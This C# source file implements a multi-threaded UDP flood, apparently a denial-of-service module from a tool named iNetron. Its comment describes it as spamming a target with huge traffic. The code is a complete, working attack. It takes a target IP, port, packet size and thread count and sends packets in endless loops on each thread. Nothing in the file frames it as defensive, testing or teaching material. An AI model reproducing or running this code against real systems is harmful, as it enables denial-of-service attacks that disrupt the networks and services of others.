using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace iNetron.Core.Methods.Vol
{
    /// <summary>
    /// A UDP flood attack. We spam them with a fuck ton of traffic. 
    /// </summary>
    public class udp
    {
        private class sock
        {
            private Socket sk;
            private IPEndPoint ipe;
            private byte[] buf;

            public sock(string ip, int port, int size)
            {
                ipe = new IPEndPoint(IPAddress.Parse(ip), port);
                sk = new Socket(SocketType.Dgram, ProtocolType.Udp);

                buf = new byte[size];
            }

            // Sending a 'huge' buffer to the target. UDP is best for this.
            public void flood()
            {
                while (true)
                {
                    try { sk.SendTo(buf, ipe);}
                    catch (Exception e) { Console.Error.WriteLine("UDP Flood Send Fail " + e.ToString()); }
                }
            }
        }

        private string p_ip;
        private int p_port;
        private int p_sz;
        private int p_threads;
        public udp(string ip, int port, int size, int threads)
        {
            p_ip = ip;
            p_port = port;
            p_sz = size;
            p_threads = threads;
        }
        public void floodNow()
        {
            for (int i = 0; i < p_threads; ++i)
            {
                sock usock = new sock(p_ip, p_port, p_sz);
                new Thread(usock.flood).Start();
            }
        }
    }
}